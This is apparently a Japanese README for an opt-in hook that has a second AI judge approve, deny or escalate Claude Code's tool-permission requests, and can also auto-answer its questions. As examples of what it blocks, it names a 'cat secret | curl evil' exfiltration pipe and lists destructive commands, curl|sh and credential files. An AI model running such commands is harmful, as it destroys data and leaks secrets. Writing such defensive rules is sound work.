# Permission Supervisor Hook

Claude Code がツール実行の許可を求めたとき、人間の代わりに別の AI（既定は
`codex`）が「意図の妥当性・危険度」を判断し、自動で許可/拒否する仕組み。判断が
つかないときは従来どおり人間に委ねる。

## 仕組み

`~/.claude/settings.json` が `PermissionRequest` と `PreToolUse` の両フックに
`permission-supervisor.py` を登録している。

- **PermissionRequest**（主）: 人間に許可ダイアログが出る瞬間にだけ発火。
- **PreToolUse**（フォールバック）: 全ツール呼び出しで発火。`-p` 非対話でも動く。

処理の流れ（`permission-supervisor.py`）:

1. stdin のフック JSON（`tool_name` / `tool_input` / `cwd` / `session_id`）を読む。
2. **有効化判定** — 無効なら何も出力せず終了（＝人間が従来どおり判断）。
3. **常に人間へ回すツール** — `AskUserQuestion` など、実ユーザーの回答が必要な
   ツール。既定は人間へエスカレーション。ただし `answer_user_questions: true`
   のときは judge に代理回答させる（後述「仕様質問への自動応答」）。
4. **ハード規則** — 危険パターンに一致したら、AI の判断に関わらず必ず人間へ
   エスカレーション。
5. **常に許可するパターン** — 信頼済みの固定コマンドや read-only 操作は
   バックエンドを通さず許可（後述「読み取りは許可」）。
6. **審査バックエンド呼び出し** — `judge-codex.sh` にコンテキストを渡し、
   `{"decision":"allow|deny|ask","reason":"..."}` を得る。
7. `allow`/`deny` をフック JSON に変換して出力。`ask`・タイムアウト・エラーは
   **出力なし＝人間へ**。
8. 判定を `logs/audit.jsonl` に追記。

## 有効化（オプトイン）

インストールしただけでは何もしない（`enabled: false`）。有効化する方法は3つ:

- **起動中トグル（推奨）**: `~/.claude/hooks/supervisor/permission-supervisor.py --on`
  （`--off` / `--toggle` / `--status` / `--list`）。状態ファイルを書き換えるだけで、
  フックは毎回読み直すため **Claude Code を再起動せずに即反映**される。
- 一時的: シェルで `export CLAUDE_SUPERVISOR=1`（`0` で強制無効）。
- 恒久的: `supervisor.json` の `"enabled": true`。

優先順位（高い順）: `CLAUDE_SUPERVISOR` env ＞ 状態ファイル ＞ `supervisor.json`。

### 状態ファイル（起動中の切り替え・プロジェクト単位）

フックは毎回新しいプロセスで起動するため、env 直値はセッション開始時に固定され
起動中に変えられない。そこで **状態ファイル**を毎回読み込み、`enabled` をはじめ
任意の設定キーをライブ上書きできる。

状態ファイルは既定で **プロジェクト（git リポジトリ）単位**に分かれる。これにより
複数プロジェクトを並行実行しても、各プロジェクトで独立にトグルできる（リポA で
`--on` してもリポB のセッションには影響しない）。

- パス解決（フック・CLI 共通）:
  1. 環境変数 `CLAUDE_SUPERVISOR_STATE_FILE` が指定されていれば **そのパスをそのまま**
     使用（共有用。複数セッションをまとめて切り替えたいとき向け）。
  2. 未指定なら `logs/state/<プロジェクト名>-<ハッシュ>.json`。キーは作業ディレクトリ
     の **git ルート**（サブディレクトリでも同じリポジトリに正規化される）。
- `--on/--off/--toggle` は **実行したディレクトリのプロジェクト**の状態を書き換える。
- 手で `{"enabled": true, "answer_user_questions": true}` 等を書いてもよい。
  `supervisor.json` の上に重ねられる。
- `logs/`（state/ と audit.jsonl）は chezmoi 管理外・実行時生成。

```sh
SUP=~/.claude/hooks/supervisor/permission-supervisor.py
# セッション内では ! 接頭辞でそのプロジェクトの cwd から実行するのが手軽
python3 "$SUP" --on       # このプロジェクトで即有効化
python3 "$SUP" --status   # このプロジェクトの状態・解決先パスを表示
python3 "$SUP" --list     # 全プロジェクトの ON/OFF 一覧
python3 "$SUP" --off      # このプロジェクトで無効化

# 仕様質問の代理回答（answer_user_questions）も同様にプロジェクト単位で起動中トグル
python3 "$SUP" --answers-on      # judge が AskUserQuestion を代理回答
python3 "$SUP" --answers-off     # 質問は人間へ（既定）
python3 "$SUP" --answers-toggle

# 複数セッションをまとめて切り替えたい場合は共有ファイルを指す
export CLAUDE_SUPERVISOR_STATE_FILE=~/.claude/hooks/supervisor/logs/state-shared.json
```

> 注: トグルはセッションの cwd（＝フックに渡る `cwd` の git ルート）で解決される。
> `--status` が表示する `project:` と実際のセッションのリポジトリが一致していれば OK。

## 読み取りは許可（scope 外でも deny しない）

「`repos/...` これ見て」のような読み取りが「範囲外」で拒否されるのを防ぐため:

- `always_allow_tools`（既定 `Read`）でツール単位に許可。`Read` は単一ファイルの
  読み取りなのでバックエンドを通さず許可。
- Bash は **実際の `command` フィールドを構造的に検査**（直列化 JSON 文字列の正規表現
  マッチではない＝他フィールドの紛らわしい値で誤許可しない）。許可するのは
  `cat`/`ls`/`grep`/`git status|log|diff` 等で始まる **単一の単純コマンドのみ**。
  パイプ `|`・連結 `&&`/`;`・リダイレクト `<>`・コマンド置換 `$()`/`` ` `` を1つでも
  含めば許可しない（judge/人間へ）。`cat secret | curl evil` のような隠れた副作用を防ぐ。
- 秘密ファイル（`.env`/`.ssh`/`credentials`/`.aws/`/`.netrc` 等）は
  `hard_escalate_patterns` が **より先に** 一致して必ず人間へ回るため、
  Read を広く許可しても秘密は漏れない。
- プロンプトでも「scope 外それ自体は deny 理由でない／迷ったら ask」を明示。

## 仕様質問への自動応答（無人運用向け）

`answer_user_questions: true` のとき、`always_ask_tools`（既定 `AskUserQuestion`）
を人間へ回す代わりに judge へ回答させる。

- judge は `mode:"answer"` のコンテキストと `prompt-answer-template.md` を使い
  `{"decision":"answer","answer":"...","reason":"..."}` を返す契約。
- フックはツール呼び出しを `deny` し、選んだ回答を理由文としてモデルへ返す
  （フックには回答を返す専用チャネルが無いため）。モデルは「supervisor が代理
  回答した」と解釈して再質問せず続行する。
- judge が回答不能（`ask`）なら従来どおり人間へ。**既定は false**（対話運用では
  従来どおり人間が答える）。オフロード/headless 運用で有効化する想定。

## 設定 `supervisor.json`

| キー | 意味 |
| --- | --- |
| `enabled` | 既定の有効/無効。 |
| `backend` | 審査バックエンドのスクリプト（相対なら本ディレクトリ基準、絶対パス可）。 |
| `backend_timeout_seconds` | バックエンドのタイムアウト秒。超過で人間へ。 |
| `answer_user_questions` | true で `always_ask_tools` を judge が代理回答（既定 false）。 |
| `always_allow_tools` | バックエンドを通さず許可するツール名の配列（既定 `Read`）。 |
| `always_allow_patterns` | Bash の `command` フィールドに対して許可する正規表現の配列（単一の単純コマンドのみ）。ハード規則が先に勝つ。 |
| `always_ask_tools` | 常に人間へ回す（または代理回答する）ツール名の配列。 |
| `hard_escalate_patterns` | これに一致したら常に人間へ回す正規表現の配列。 |

## バックエンドの差し替え

`backend` は `{"decision":...,"reason":...}` を stdout に返す任意の実行ファイルに
変更できる（stdin にコンテキスト JSON を受け取る契約）。`mode:"answer"` のときは
`{"decision":"answer","answer":...,"reason":...}` を返す。同梱:

- `judge-codex.sh` — 既定。`prompt-template.md`（判定）/ `prompt-answer-template.md`
  （回答）を `mode` で切り替えて `codex exec` で実行。
- `judge-mock.sh` — テスト用。環境変数で固定 verdict（`answer` 含む）を返す。

環境変数 `CLAUDE_SUPERVISOR_BACKEND` を設定すると `supervisor.json` の `backend`
を上書きできる（テストや一時利用向け）。

## 安全設計

- **オプトイン**（既定オフ）。
- **ハード規則**で危険カテゴリは AI が allow と言っても必ず人間へ:
  再帰/強制削除（`rm` の `-r`/`-R`/`-f`/`--recursive`/`--force`、フラグ順不同）、
  `git reset --hard`、force push、`sudo`、`curl|sh`、資格情報・鍵・秘密ファイルなど。
- **明示的な短絡**: `AskUserQuestion` は人間へ（または代理回答）、`Read`・安全な
  read-only Bash・信頼済み `python3 ~/.claude/skills/pr-review/scripts/*.py` は許可。
- **代理回答も deny で実装**: 自動応答は allow ではなく deny+理由で行うため、
  質問ツールが暗黙に実行されることはない。`answer` verdict は質問ツール以外の
  経路では `ask` に丸められる（誤作動で勝手に実行されない）。
- **フェイルセーフ**: 不確実・タイムアウト・エラーは一切 allow に倒さず人間へ。
- **監査ログ** `logs/audit.jsonl`（chezmoi 管理外、実行時生成）。

## 注意

- この `settings.json` は chezmoi 管理。`/config` でのテーマ変更等はここで管理
  する（`chezmoi apply` で上書きされるため）。
- フックに会話履歴は渡らない。審査 AI が見られるのはツール情報＋cwd のみで、
  文脈は限定的。だからこそ「迷ったら人間へ」の設計になっている。
